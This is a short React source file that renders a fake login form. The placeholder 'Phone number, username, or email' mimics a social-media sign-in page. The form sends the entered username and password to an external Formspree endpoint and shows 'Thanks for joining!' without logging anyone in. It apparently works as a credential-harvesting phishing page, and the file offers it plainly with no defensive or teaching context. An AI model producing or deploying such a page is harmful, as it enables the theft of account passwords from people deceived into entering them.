// Make sure to run npm install @formspree/react
// For more help visit https://formspr.ee/react-help
import React from 'react';
import { useForm, ValidationError } from '@formspree/react';
function Log() {
  const [state, handleSubmit] = useForm("xbjejpyv");
  if (state.succeeded) {
      return <p>Thanks for joining!</p>;
  }
  return (
      <form onSubmit={handleSubmit}>
<div class="input-box">
      <input type="text"
               id="name" 
   aria-describedby="" 
        placeholder="Phone number, username, or email"
      aria-required="true" 
         maxlength="30" 
    autocapitalize="off"
       autocorrect="off" 
              name="username"
             value="" />
                    </div>  
<div class="input-box">
                     
 <input type="password" 
        name="password"
          id="password" 
 placeholder="Password" 
aria-describedby="" 
maxlength="30" 
aria-required="true" 
autocapitalize="off" 
autocorrect="off" />
                    </div>
      <button class="btn" type="submit" disabled={state.submitting}>
        Log In
      </button>
    </form>
  );
}
function App() {
  return (
    <Log />
  );
}
export default App;
